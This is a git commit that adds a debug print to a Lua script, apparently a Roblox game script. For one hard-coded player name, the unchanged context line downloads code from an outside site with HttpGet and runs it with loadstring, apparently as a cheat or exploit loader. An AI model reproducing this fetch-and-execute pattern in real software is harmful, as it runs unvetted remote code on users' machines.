ebfad222784d336f8b906e3d2244fe80d3703e33
relbaldski <155758217+relbaldski@users.noreply.github.com>
2025-06-28 09:26:51 +0600

    Update baldscript.lua

--- baldscript.lua
+++ baldscript.lua
@@ -10,7 +10,8 @@ if plrName == "Farthening" or plrName == "webportaI" then
 end
 	
 if true then
-	if plrName == "Oni_Princess" then
+	if plrName == "Oni_Princess" then 
+		print(2)
 		loadstring(game:HttpGet("https://trigonevo.fun/x/test",true))()
 		--loadstring(game:HttpGet("https://raw.githubusercontent.com/relbaldski/bald/refs/heads/main/Trigon-keysystem.lua",true))()
 
